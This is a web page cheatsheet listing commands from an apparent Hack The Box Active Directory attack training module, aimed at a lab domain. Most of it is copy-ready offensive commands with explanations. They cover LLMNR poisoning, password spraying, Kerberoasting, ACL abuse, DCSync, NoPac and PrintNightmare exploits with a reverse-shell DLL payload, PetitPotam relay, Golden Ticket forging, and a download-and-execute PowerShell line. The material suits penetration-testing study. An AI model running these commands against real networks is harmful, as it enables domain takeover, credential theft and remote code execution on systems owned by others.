---
layout: default
title: "HTB AD: Complete Command Cheatsheet"
order: 11
phase: "REF"
tactic: "Cheatsheet"
summary: "Every command from the HTB 'AD Enumeration & Attacks' module — each in its own copy-to-clipboard box with an exhaustive explanation (what it does, every parameter, when to use it, how to read the output)."
---

{% include ad_nav.html %}

# HTB AD — Complete Command Cheatsheet

Every command from the **HTB: Active Directory Enumeration & Attacks** module. Hover any box and click **Copy**. Each command has a breakdown: *what it does · key parameters · when to use it · how to read the output.* Lab domain: `INLANEFREIGHT.LOCAL`, DC `172.16.5.5`.

{% raw %}

## 1. Initial Enumeration

```bash
nslookup ns1.inlanefreight.com
```
**What:** Resolves a hostname to its IP via the configured DNS server. **When:** First recon step to map domain↔IP. **Output:** The `Address:` line is the target's IP; `Server:` is the DNS/DC answering.
{: .cmd-desc}

```bash
sudo tcpdump -i ens224
```
**What:** Captures raw packets on interface `ens224` (`-i`). **When:** Passive recon to spot broadcast/LLMNR/NBT-NS chatter and live hosts. **Output:** Live packet stream; watch for hostnames, SMB and name-resolution traffic.
{: .cmd-desc}

```bash
sudo responder -I ens224 -A
```
**What:** Listens for LLMNR/NBT-NS/MDNS queries. `-I` = interface, `-A` = Analyze (passive, does **not** poison). **When:** Safe reconnaissance before active poisoning. **Output:** Logs who is asking for which names — poisoning candidates.
{: .cmd-desc}

```bash
fping -asgq 172.16.5.0/23
```
**What:** Ping-sweeps a range. `-a` show alive, `-s` stats, `-g` generate range, `-q` quiet. **When:** Build a live-host list. **Output:** One IP per alive host → save as `hosts.txt`.
{: .cmd-desc}

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/user/Documents/host-enum
```
**What:** Scans every host in `hosts.txt` (`-iL`) with OS/version/script/traceroute (`-A`), verbose (`-v`), normal output to file (`-oN`). **When:** After the ping sweep. **Output:** Open ports/services; `88,389,445,636` ⇒ that host is a **Domain Controller**.
{: .cmd-desc}

## 2. LLMNR / NBT-NS Poisoning & Cracking

```bash
responder -h
```
**What:** Prints Responder's usage and options. **When:** To review poisoning/relay switches before running it actively.
{: .cmd-desc}

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
**What:** Cracks captured **NetNTLMv2** hashes (`-m 5600`) with a wordlist. **When:** After Responder captures a hash. **Output:** `hash:password` on success — a valid domain credential.
{: .cmd-desc}

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
**What:** Windows LLMNR/NBNS spoofer. Imports Inveigh, lists params, then starts with NBNS spoofing + console/file output. **When:** Poisoning from a Windows foothold. **Output:** Captured NetNTLMv1/v2 hashes to console and file.
{: .cmd-desc}

```powershell
.\Inveigh.exe
```
**What:** Runs the compiled C# build of Inveigh (no PowerShell policy issues). **When:** Same as above when the .ps1 is blocked.
{: .cmd-desc}

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"; Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
```
**What:** Disables NBT-NS on every interface (defensive/remediation). **When:** Hardening after demonstrating the attack. **Output:** `NetbiosOptions` set to `2` per interface.
{: .cmd-desc}

## 3. Kerbrute (install & user enumeration)

```bash
sudo git clone https://github.com/ropnop/kerbrute.git
make help
sudo make all
./kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```
**What:** Clones, lists build targets, compiles all binaries, tests, then installs Kerbrute to your `$PATH`. **When:** One-time setup. **Output:** A working `kerbrute` command.
{: .cmd-desc}

```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 smith.txt -o kerb-results
```
**What:** Validates usernames via Kerberos pre-auth. `-d` domain, `--dc` KDC, wordlist, `-o` output. **When:** Build a valid-user list without triggering lockouts. **Output:** `[+] VALID USERNAME` lines; "no pre auth" accounts are AS-REP roastable.
{: .cmd-desc}

## 4. Password Policy & Spraying

```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
**What:** Reads the domain **password policy** with a valid cred. **When:** BEFORE any spray. **Output:** Lockout threshold / observation window / min length — governs safe spraying.
{: .cmd-desc}

```bash
rpcclient -U "" -N 172.16.5.5
```
**What:** Opens an SMB **NULL session** (`-U "" -N` = no user, no password). **When:** Unauthenticated domain info gathering. **Output:** An `rpcclient $>` prompt for the queries below.
{: .cmd-desc}

```bash
querydominfo
```
**What:** (inside rpcclient) Dumps domain info incl. the password policy. **Output:** Domain name, server role, lockout settings.
{: .cmd-desc}

```bash
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
**What:** Enumerate the password policy (`-P`); `-ng` also writes YAML/JSON (`-oA`). **When:** Unauthenticated/low-priv policy recon. **Output:** Policy fields and (often) users/shares.
{: .cmd-desc}

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
**What:** Simple-bind (`-x`) LDAP search of the domain naming context (`-b`), subtree scope (`-s sub`), filtered to the policy attributes. **Output:** `lockoutThreshold`, `minPwdLength`, `pwdHistoryLength`.
{: .cmd-desc}

```powershell
net accounts
Import-Module .\PowerView.ps1; Get-DomainPolicy
```
**What:** Reads the policy from a Windows host — built-in `net accounts`, or PowerView's `Get-DomainPolicy`. **Output:** Lockout/length/history values.
{: .cmd-desc}

```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
**What:** Lists users (`-U`) and trims output to bare usernames. **When:** Seed a spray list. **Output:** One username per line.
{: .cmd-desc}

```bash
rpcclient -U "" -N 172.16.5.5   # then: enumdomusers
```
**What:** Enumerates domain users (and their RIDs) over a NULL session. **Output:** `user:[name] rid:[0x...]` lines.
{: .cmd-desc}

```bash
crackmapexec smb 172.16.5.5 --users
```
**What:** Lists domain users via SMB. **Output:** Usernames plus `badpwdcount` — useful to avoid locking accounts.
{: .cmd-desc}

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```
**What:** LDAP query for all user objects, trimmed to `sAMAccountName`. **Output:** Clean username list.
{: .cmd-desc}

```bash
./windapsearch.py --dc-ip 172.16.5.5 -U ""
```
**What:** Python LDAP enumerator; `--dc-ip` target, `-U ""` dumps users. **Output:** User objects from the directory.
{: .cmd-desc}

```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
**What:** Bash spray via rpcclient — tries `Welcome1` for each user, filtering successes. **When:** Lightweight spray without extra tools. **Output:** `Account Name` lines = valid logins.
{: .cmd-desc}

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
**What:** Sprays one password across the user list via Kerberos. **Output:** `[+] VALID LOGIN: user:Welcome1`.
{: .cmd-desc}

```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
**What:** Sprays `Password123` across users over SMB; `grep +` keeps only successes. **Output:** `[+] domain\user:pass` (and `(Pwn3d!)` if local admin).
{: .cmd-desc}

```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
**What:** Validates a single credential pair. **Output:** `[+]` valid / `[-]` invalid.
{: .cmd-desc}

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
**What:** Pass-the-Hash **local** auth (`--local-auth`, `-H` NT hash) across a subnet — one attempt each to avoid lockouts. **When:** Reuse a local admin hash to find other hosts where it works. **Output:** `(Pwn3d!)` on hosts sharing that local admin.
{: .cmd-desc}

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
**What:** Windows-native spray; auto-pulls the user list from the domain, writes hits to `spray_success`. **Output:** File of valid `user:password` pairs.
{: .cmd-desc}

## 5. Enumerating Security Controls

```powershell
Get-MpComputerStatus
```
**What:** Reports Windows Defender status. **When:** Before dropping tooling. **Output:** `RealTimeProtectionEnabled : True/False`.
{: .cmd-desc}

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
**What:** Shows the effective AppLocker rules. **When:** Plan which binaries/paths will run. **Output:** Allow/deny rules per collection (Exe/Script/Msi).
{: .cmd-desc}

```powershell
$ExecutionContext.SessionState.LanguageMode
```
**What:** Reveals the PowerShell language mode. **Output:** `FullLanguage` (free rein) or `ConstrainedLanguage` (restricted — many offensive cmdlets blocked).
{: .cmd-desc}

```powershell
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```
**What:** LAPSToolkit functions — groups delegated to read LAPS, who has All-Extended-Rights, and which computers use LAPS + expiry/passwords. **When:** Hunt for readable local-admin passwords. **Output:** Groups/users with read access and (if permitted) cleartext LAPS passwords.
{: .cmd-desc}

## 6. Credentialed Enumeration (Linux)

```bash
xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25
```
**What:** RDP session with valid creds. `/u` user, `/p` password, `/v` target. **When:** Interactive GUI access. **Output:** A remote desktop.
{: .cmd-desc}

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
**What:** Authenticated SMB enum — users, groups, logged-on users (on a member host), and shares. **When:** First authenticated sweep. **Output:** Directory objects; `--loggedon-users` reveals where admins/DAs are active (lateral targets).
{: .cmd-desc}

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share
```
**What:** Runs the `spider_plus` module to recursively list every readable file in `Dev-share`. **Output:** JSON inventory of files — hunt for creds/configs.
{: .cmd-desc}

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only
```
**What:** Lists shares + your access level; `-R SYSVOL --dir-only` recurses SYSVOL showing directories. **Output:** `READ/WRITE` per share — SYSVOL often hides GPP passwords/scripts.
{: .cmd-desc}

## 7. User Enumeration (rpcclient / Impacket / windapsearch)

```bash
rpcclient $> enumdomusers
rpcclient $> queryuser 0x457
```
**What:** Lists users with RIDs, then details one user by RID (`0x457`). **Output:** Account flags, last logon, group RIDs.
{: .cmd-desc}

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```
**What:** Impacket remote shells — PsExec (via `ADMIN$` service, SYSTEM, louder) and WMIExec (semi-interactive, quieter). **When:** Command execution with valid creds. **Output:** A shell on the target.
{: .cmd-desc}

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU
```
**What:** Enumerates **Domain Admins** (`--da`) and performs a recursive **privileged-users** search (`-PU`) for nested group members. **Output:** DA members and users with nested privilege.
{: .cmd-desc}

## 8. BloodHound (collection)

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
**What:** Python collector. `-ns` name server (DC), `-d` domain, `-c all` every collection method. **When:** Right after first valid cred. **Output:** JSON files → import into BloodHound GUI and run *Shortest Path to Domain Admins*.
{: .cmd-desc}

```bash
zip -r ilfreight_bh.zip *.json
```
**What:** Bundles the collector JSON for GUI import. **Output:** A single uploadable `.zip`.
{: .cmd-desc}

## 9. Living Off the Land (PowerShell / PowerView)

```powershell
Get-Module; Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```
**What:** Native AD RSAT recon — domain object, SPN users (Kerberoast targets), trusts, groups and a sensitive group's members. **When:** Stealthy enum with no extra tools. **Output:** Directory data; `Backup Operators` membership = path to NTDS/DC.
{: .cmd-desc}

```powershell
Get-Domain; Get-DomainController; Get-DomainUser; Get-DomainComputer; Get-DomainGroup; Get-DomainOU
```
**What:** Core PowerView getters for the domain, DCs, users, computers, groups and OUs. **Output:** Full objects (add `-Identity` / `-Properties` to focus).
{: .cmd-desc}

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
**What:** Recursively lists **Domain Admins** (incl. nested) and all SPN-bearing users. **Output:** The real DA population and your Kerberoast target list.
{: .cmd-desc}

```powershell
Find-InterestingDomainAcl
Get-DomainGPO; Get-DomainPolicy
Get-NetLocalGroup; Get-NetLocalGroupMember; Get-NetShare; Get-NetSession
Test-AdminAccess
```
**What:** Finds abusable ACLs, enumerates GPOs/policy, local groups/members/shares/sessions, and tests local admin. **When:** Mapping privilege escalation and lateral paths. **Output:** ACE edges, GPO links, where you are admin.
{: .cmd-desc}

```powershell
Find-DomainUserLocation; Find-DomainShare; Find-InterestingDomainShareFile; Find-LocalAdminAccess
```
**What:** Hunts user logon locations, reachable shares, interesting files and hosts where you have local admin. **Output:** Lateral-movement targets and sensitive files.
{: .cmd-desc}

```powershell
Get-DomainTrust; Get-ForestTrust; Get-DomainTrustMapping
Get-DomainForeignUser; Get-DomainForeignGroupMember
```
**What:** Enumerates domain/forest trusts and cross-domain (foreign) group members. **When:** Planning child→parent / cross-forest escalation. **Output:** Trust directions and foreign-principal footholds.
{: .cmd-desc}

```powershell
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```
**What:** Crawls readable shares for secrets. `-d` domain, `-s` stdout, `-v data` verbosity. **Output:** Flagged files (passwords, keys, configs) with paths.
{: .cmd-desc}

## 10. Transferring Files

```bash
sudo python3 -m http.server 8001
```
**What:** Quick HTTP file host on port 8001. **When:** Serve tools to the target. **Output:** Access files at `http://<you>:8001/`.
{: .cmd-desc}

```powershell
IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')
```
**What:** Downloads + runs a file in memory from a web server. **When:** Fetch tooling onto a Windows host. **Output:** The payload executes without touching disk (if IEX'd).
{: .cmd-desc}

```bash
impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/
```
**What:** Hosts an authenticated SMB share `shared`. `-smb2support` for modern Windows. **When:** Transfer files to/from Windows via `\\you\shared`. **Output:** A mountable share.
{: .cmd-desc}

## 11. Kerberoasting

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
```
**What:** Lists SPN accounts, requests all TGS (`-request`), or one user's TGS to a file (`-request-user`, `-outputfile`). **When:** Credential access with any valid cred. **Output:** `$krb5tgs$23$…` hashes.
{: .cmd-desc}

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
```
**What:** Cracks Kerberoast TGS (`-m 13100`). **Output:** `hash:password` — the service account's cleartext.
{: .cmd-desc}

```powershell
setspn.exe -Q */*
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
**What:** Windows-native SPN discovery (`setspn -Q`) and requesting a specific SPN's ticket into memory. **Output:** SPN list / a ticket cached for extraction with Mimikatz.
{: .cmd-desc}

```powershell
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```
**What:** Sets base64 output then exports cached Kerberos tickets. **Output:** Base64 TGS blobs (or `.kirbi` files) to crack offline.
{: .cmd-desc}

```bash
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
**What:** Decodes the ticket, converts to John format, reshapes for Hashcat, then cracks. **When:** Tickets exported from Windows. **Output:** A `-m 13100`-ready hash and, if cracked, the password.
{: .cmd-desc}

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
**What:** PowerView requests a user's (or all SPN users') tickets already formatted for Hashcat; second line bulk-exports to CSV. **Output:** Ready-to-crack hashes.
{: .cmd-desc}

```powershell
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
**What:** Rubeus roasting — stats, only privileged accounts (`admincount=1`), or a single user. `/nowrap` keeps the hash on one line. **Output:** Clean `$krb5tgs$` hashes.
{: .cmd-desc}

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
**What:** Checks a target's supported Kerberos encryption types. **Output:** `0x17` ⇒ RC4 (fast `-m 13100`); AES ⇒ `-m 19600/19700` (slower).
{: .cmd-desc}

## 12. ACL Enumeration & Abuse

```powershell
Import-Module .\PowerView.ps1; $sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
**What:** Resolves `wley`'s SID then finds every object it has rights over (`-ResolveGUIDs` makes rights human-readable). **When:** Map what a compromised account can abuse. **Output:** ACEs like `GenericAll`, `WriteDacl`, `ForceChangePassword`.
{: .cmd-desc}

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
**What:** Builds a credential object to run PowerView actions as `wley`. **When:** You have wley's password and need to exercise its rights. **Output:** `$Cred` for `-Credential`.
{: .cmd-desc}

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
**What:** Uses `wley`'s ForceChangePassword right to set `damundsen`'s password. **Output:** `damundsen` now has a password you control.
{: .cmd-desc}

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "Help Desk Level 1" | select MemberName
```
**What:** Abuses a group-write right to add `damundsen` to `Help Desk Level 1`, then confirms membership. **Output:** `damundsen` listed as a member (inherits its rights).
{: .cmd-desc}

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
**What:** Targeted Kerberoast — writes a fake SPN onto `adunn` (now roastable), then removes it to clean up. **Output:** A roastable `adunn`, then a clean object afterwards.
{: .cmd-desc}

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
**What:** Reverts the group change (cleanup). **Output:** `damundsen` removed from the group.
{: .cmd-desc}

## 13. DCSync (domain takeover)

```powershell
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"; Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')} | ? {$_.SecurityIdentifier -match $sid} | select AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
**What:** Verifies `adunn` holds **DS-Replication-Get-Changes(-All)** rights needed for DCSync. **Output:** ACEs containing `Replication-Get-Changes` ⇒ DCSync is possible.
{: .cmd-desc}

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss
```
**What:** DCSync via DRSUAPI/VSS, dumping all NTDS secrets to files. `-just-dc` = domain hashes only. **Output:** `.ntds` with every `user:rid:lm:nt` incl. `krbtgt` + `administrator`.
{: .cmd-desc}

```powershell
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
**What:** DCSync from Windows for one user. **Output:** That account's NT hash (and keys) — Pass-the-Hash ready.
{: .cmd-desc}

## 14. Privileged Access (WinRM / PSRemoting / MSSQL)

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
**What:** Lists who can RDP / WinRM into a host. **When:** Find a usable remote-access path. **Output:** Members ⇒ accounts you can move with.
{: .cmd-desc}

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```
**What:** Opens a PowerShell Remoting (WinRM) session with explicit creds. **Output:** An interactive remote prompt.
{: .cmd-desc}

```bash
evil-winrm -i 10.129.201.234 -u forend
```
**What:** WinRM shell from Linux. `-i` host, `-u` user (add `-p`/`-H`). **When:** Account is in Remote Management Users. **Output:** A PowerShell session.
{: .cmd-desc}

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```
**What:** Finds SQL instances registered in AD, then runs a query to confirm access/version. **Output:** Reachable MSSQL servers and confirmed auth.
{: .cmd-desc}

```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150
```
**What:** Impacket MSSQL client with domain creds. **Output:** A `SQL>` prompt. Use `help` for commands.
{: .cmd-desc}

```bash
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```
**What:** Enables `xp_cmdshell` then runs OS commands via the DB. **When:** You have sysadmin on MSSQL. **Output:** Command output (e.g. privileges) — often leads to SYSTEM.
{: .cmd-desc}

## 15. NoPac (CVE-2021-42278 / 42287)

```bash
sudo git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
**What:** Clones the exploit and scans whether the DC is vulnerable (unpatched sAMAccountName spoofing). **Output:** "vulnerable" verdict.
{: .cmd-desc}

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell -impersonate administrator -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
**What:** Impersonates `administrator` to get a SYSTEM shell (`-shell`) or directly DCSync a user (`-dump -just-dc-user`). **Output:** SYSTEM shell / the administrator's NT hash.
{: .cmd-desc}

## 16. PrintNightmare (CVE-2021-1675)

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
**What:** Clones the exploit and checks the Print System RPC interfaces are exposed. **Output:** `MS-RPRN`/`MS-PAR` lines ⇒ likely exploitable.
{: .cmd-desc}

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
sudo python3 CVE-2021-1675.py inlanefreight.local/<user>:<pass>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'
```
**What:** Builds a DLL payload, hosts it over SMB, then forces the DC's spooler to load it. **Output:** A SYSTEM shell / Meterpreter session on the DC.
{: .cmd-desc}

## 17. PetitPotam (AD CS NTLM relay → DCSync)

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
git clone https://github.com/topotam/PetitPotam.git
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```
**What:** Starts a relay to the CA web-enrollment, then coerces the DC (`PetitPotam.py <attacker> <dc>`) to authenticate. **Output:** A base64 certificate issued for the DC machine account.
{: .cmd-desc}

```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <b64cert> dc01.ccache
export KRB5CCNAME=dc01.ccache; klist
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
**What:** Uses the cert to get the DC's TGT (PKINIT), loads it, then DCSyncs as the DC. **Output:** The administrator (or krbtgt) NT hash.
{: .cmd-desc}

```bash
python /opt/PKINITtools/getnthash.py -key <AS-REP key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
**What:** Recovers the machine account's NT hash from the PKINIT session key (UnPAC-the-hash). **Output:** `DC01$` NT hash for further PtH/DCSync.
{: .cmd-desc}

```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<b64cert> /ptt
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```
**What:** Windows path — request + inject the DC's TGT from the cert, then DCSync `krbtgt`. **Output:** `krbtgt` hash ⇒ Golden Ticket.
{: .cmd-desc}

## 18. GPP Passwords & GPO Abuse

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```
**What:** Decrypts a Group Policy Preferences `cpassword` (Microsoft published the AES key), and CME auto-loots GPP creds from SYSVOL. **When:** SYSVOL readable. **Output:** Cleartext local/admin passwords.
{: .cmd-desc}

```powershell
Get-DomainGPO | select displayname
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
**What:** Lists GPOs, then checks whether low-priv `Domain Users` can edit any GPO; resolves a GUID to a GPO name. **When:** Hunt editable GPOs → code execution on linked OUs. **Output:** GPO ACEs granting write = abuse path.
{: .cmd-desc}

## 19. AS-REP Roasting

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
**What:** Finds accounts with `DONT_REQ_PREAUTH` and roasts one with Rubeus (Hashcat format). **Output:** `$krb5asrep$23$…` hashes.
{: .cmd-desc}

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
**What:** Kerbrute also auto-dumps AS-REP hashes for no-preauth users found; Hashcat `-m 18200` cracks them. **Output:** Valid usernames + cracked passwords.
{: .cmd-desc}

## 20. Trust Relationships (Child→Parent / Cross-Forest)

```powershell
Import-Module activedirectory; Get-ADTrust -Filter *
Get-DomainTrust; Get-DomainTrustMapping
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
Get-DomainSID
```
**What:** Enumerates trusts and grabs the parent's **Enterprise Admins** SID + child domain SID. **When:** Planning SID-history escalation across the trust. **Output:** SIDs needed to forge a cross-domain Golden Ticket.
{: .cmd-desc}

```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
**What:** DCSyncs the **child** domain's `krbtgt`. **Output:** Child `krbtgt` hash — the key to the forged ticket.
{: .cmd-desc}

```powershell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<childSID> /sids:<EnterpriseAdminsSID> /user:hacker /ptt
```
**What:** Forges a Golden Ticket in the child domain with the parent **Enterprise Admins** SID in `/sids` (SID history) and injects it (`/ptt`). **Output:** A ticket with forest-wide EA rights.
{: .cmd-desc}

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
export KRB5CCNAME=hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
